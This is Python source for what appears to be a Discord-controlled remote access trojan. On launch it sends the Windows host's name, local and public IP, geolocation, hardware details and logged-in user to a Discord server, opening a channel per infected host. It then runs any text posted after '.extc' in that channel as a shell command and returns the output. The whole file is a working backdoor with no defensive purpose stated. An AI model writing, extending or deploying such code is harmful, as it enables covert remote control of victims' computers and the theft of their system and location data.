import configparser
import socket
import platform
import psutil
import requests
import discord
import threading
import subprocess
import wmi
import asyncio

bd = None
config_file_path = 'config.ini'
config = configparser.ConfigParser()
config.read(config_file_path)
BOT_TOKEN = config['Settings']['token']
GUILD_ID = config['Settings']['server_id']
GUILD_ID = int(GUILD_ID)
intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
c = wmi.WMI()
hostname = socket.gethostname()
client = discord.Client(intents=discord.Intents.all())
# Create the dictionary
channel_ids = {
    "info": "Initial info value",
    "main": "Initial main value"
}
class StoreVariables:
    def __init__(self, var1=None):
        self.var1 = var1
def thread_function(*args):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(execute_command(*args))
    loop.close()
ForExecutingCommands = StoreVariables()
async def execute_command(*args):
    try:
        command = ''.join(args)
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout
        channel = client.get_channel(ForExecutingCommands.var1)
        await channel.send(output)
    except Exception as e:
        print(e)
def get_system_info():
    try:
        local_ip_address = socket.gethostbyname(hostname)
    except socket.gaierror:
        local_ip_address = "Unable to get local IP Address"
    try:
        response = requests.get("https://ipinfo.io/json")
        if response.status_code == 200:
            ip_info = response.json()
            public_ip = ip_info.get("ip", "N/A")
            city = ip_info.get("city", "N/A")
            region = ip_info.get("region", "N/A")
            country = ip_info.get("country", "N/A")
            org = ip_info.get("org", "N/A")
        else:
            public_ip, city, region, country, org = ["N/A"] * 5
    except requests.RequestException:
        public_ip, city, region, country, org = ["N/A"] * 5
    system = platform.system()
    release = platform.release()
    version = platform.version()
    machine = platform.machine()
    processor = platform.processor()
    registered_user = c.Win32_ComputerSystem()[0].UserName
    cpu_count = psutil.cpu_count(logical=True)
    cpu_physical_cores = psutil.cpu_count(logical=False)
    cpu_freq = psutil.cpu_freq().current if psutil.cpu_freq() else "Unknown"
    virtual_mem = psutil.virtual_memory()
    total_memory = virtual_mem.total / (1024 ** 3)  # Convert to GB
    disk_info = psutil.disk_usage('/')
    total_disk = disk_info.total / (1024 ** 3)  # Convert to GB
    info = (
        f"**Local Hostname:** {hostname}\n"
        f"**Local IP Address:** {local_ip_address}\n"
        f"**Public IP Address:** {public_ip}\n"
        f"**Location:** {city}, {region}, {country}\n"
        f"**Organization:** {org}\n"
        f"**Operating System:** {system} {release}\n"
        f"**OS Version:** {version}\n"
        f"**Machine:** {machine}\n"
        f"**Processor:** {processor}\n"
        f"**CPU Count:** {cpu_count} (Physical: {cpu_physical_cores})\n"
        f"**CPU Frequency:** {cpu_freq} MHz\n"
        f"**Total Memory:** {total_memory:.2f} GB\n"
        f"**Total Disk Space:** {total_disk:.2f} GB\n"
        f"**Registered User:** {registered_user}"
    )
    return hostname, info
@client.event
async def on_ready():
    print(f"{client.user} has connected to Discord!")
    guild = discord.utils.get(client.guilds, id=GUILD_ID)
    if not guild:
        print(f"Could not find guild with ID {GUILD_ID}. Make sure the bot is added to the server.")
        return
    print("Getting system info")
    hostname, system_info = get_system_info()
    category = discord.utils.get(guild.categories, name=hostname)
    info_channel_name = f"{hostname}-info"
    info_channel = discord.utils.get(category.channels, name=info_channel_name)
    if not category:
        category = await guild.create_category(name=hostname)
    hostname = hostname.lower()
    if f"{hostname}-info" not in category.channels:
        info_channel = await category.create_text_channel(name=info_channel_name)
    info_channel_id = info_channel.id
    channel_ids["info"] = info_channel_id
    await info_channel.send(system_info)
    commands_channel_name = f"{hostname}-commands"
    commands_channel_name = commands_channel_name.lower()
    commands_channel = discord.utils.get(category.channels, name=commands_channel_name)
    if f"{hostname}-commands" not in category.channels:
        commands_channel = await category.create_text_channel(name=commands_channel_name)
        commands_channel_id = commands_channel.id
        channel_ids['main'] = commands_channel_id
    else:
        print(f"Command channel already exists: {commands_channel_name}")
@client.event
async def on_message(message):
    if message.author != client.user:
        if message.content == f'<@{client.user.id}>':
            await client.get_channel(channel_ids[f'main']).send(f'<@{message.author.id}>')
        if message.channel.id in channel_ids.values():
            if ".extc" in message.content:
                ForExecutingCommands.var1 = message.channel.id
                words = message.content.split()
                result_string = ' '.join([word for word in words if word != ".extc"])
                #print(f"Result String: {result_string}")
                extc = threading.Thread(target=thread_function, args=(result_string))
                extc.start()

client.run(BOT_TOKEN)